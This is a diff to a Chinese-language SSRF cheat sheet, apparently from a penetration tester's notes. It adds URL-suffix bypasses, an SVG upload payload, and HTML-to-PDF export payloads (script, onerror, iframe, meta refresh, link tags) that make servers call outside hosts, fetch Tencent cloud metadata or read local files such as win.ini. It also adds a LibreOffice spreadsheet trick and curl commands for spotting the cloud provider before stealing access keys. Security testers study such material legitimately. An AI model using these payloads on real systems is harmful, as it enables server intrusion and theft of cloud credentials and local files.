@@ -12,6 +12,7 @@ SSRF
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
 + 大部分情况都是GET型SSRF漏洞，仅能探测存活，扫描端口，内网域名探测等，危害十分有限。
++ 其中 **元数据泄露（导致ak，sk泄露）的SSRF漏洞** 危害最大
 
 原理
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -100,10 +101,28 @@ DNS重绑定绕过
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + https://lock.cmpxchg8b.com/rebinder.html ： 绑定一个内网，一个外网，多尝试几次即可
 
+#或者？绕过
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ ``https://ssrf.xx.com/?.svg``
++ ``https://ssrf.xx.com/#.svg``
+
 特殊场景
 ----------------------------------------
 
-文件（PDF）导出功能的SSRF
+上传图片等URL的场景
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 如上传图像URL等功能，上传url后，服务器后端可能会对该url进行访问，攻击者可以构造一个url（或302跳转）指向内网或者本地的地址来进行SSRF攻击。
++ 上传svg图片
+	- 图片格式： ``image/svg+xml``
+	- 图片内容
+		::
+		
+			<xml version="1.0" encoding="UTF-8" standalone="no"?>
+			<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" viewBox="0 0 200 200">
+			<image xlink:href="https://xxx.ssrf.com/1.png" height="200" width="200"/>
+			</svg>
+
+HTML导出PDF功能的SSRF
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ::
 
@@ -114,33 +133,16 @@ DNS重绑定绕过
 	</body>
 
 	利用script标签：
-	<body>
-	<h1>Proof that you Signed Your Life Away</h1>
 	<img src=""><body id="body">  <script>jsImg = new Image();jsImg.src="https://xxx.xxx.xxx/1.png";document.getElementById("body").appendChild(jsImg);</script></body>"></img>
-	</body>
-
-::
 
 	利用onerror事件：
-	<body>
-	<h1>Proof that you Signed Your Life Away</h1>
 	<img src=""><img src="a" onerror='var jsImg = new Image; jsImg.src="https://{{YOUR_BURP_COLLAB_URL_HERE}}";'></img>"></img>
-	</body>
-
-::
 
 	利用iframe标签：
-	<body>
-	<h1>Proof that you Signed Your Life Away</h1>
 	<img src=""><iframe src="http://metadata.tencentyun.com/latest/meta-data"></iframe>"></img>
-	</body>
-
-::
 
 	利用meta refresh:
 	<meta http-equiv="refresh" content="0;url=http://metadata.tencentyun.com/latest/meta-data" />
-
-::
 
 	利用SVG标签：
 	<svg width="100%" height="100%" viewBox="0 0 100 100" 
@@ -155,11 +157,11 @@ DNS重绑定绕过
 	})});" />
 	</svg>
 
-::
-
 	利用link：
 	<link rel=attachment href="file:///C:/Windows/win.ini">
 	href也可以使用http/https协议
+	工具：weasyprint.exe input.html output.pdf
+	注：在创建pdf的时候，会将本地文件内容包含进去，或者发起远程的http请求返回内容包含进去，攻击者可以通过解析pdf文件来获取这些内容。
 	导出的pdf文件可以使用以下脚本数据：
 	import sys, zlib
 
@@ -187,8 +189,23 @@ DNS重绑定绕过
 	if __name__=='__main__':
 		main(*sys.argv[1:])
 
+基于开源libreoffice的HTML转PDF功能
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 攻击者可以构造一个HTML文件，包含一些特殊标签，如img、iframe、link等，在生成PDF文件时会将这些标签解析并发起相应的请求或者读取本地文件内容，攻击者可以通过解析生成的PDF文件来获取这些内容。
++ excel文件转换pdf
+	- 创建一个.ods文件
+	- 插入ole对象或者公式如 ``=INFO("osversion")``
+	- 文件重命名为.xlsx
+	- 上传文件之后观察pdf文件是否包含了相关内容
+
 云服务器
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+::
+
+	curl cip.cc/1.1.1.1
+	curl ipinfo.io/1.1.1.1
+	使用上述命令查看返回包判断属于哪个云服务器，针对不同云服务器的元数据接口进行SSRF攻击
+
 ::
 
 	泄漏 IAM 角色名称:
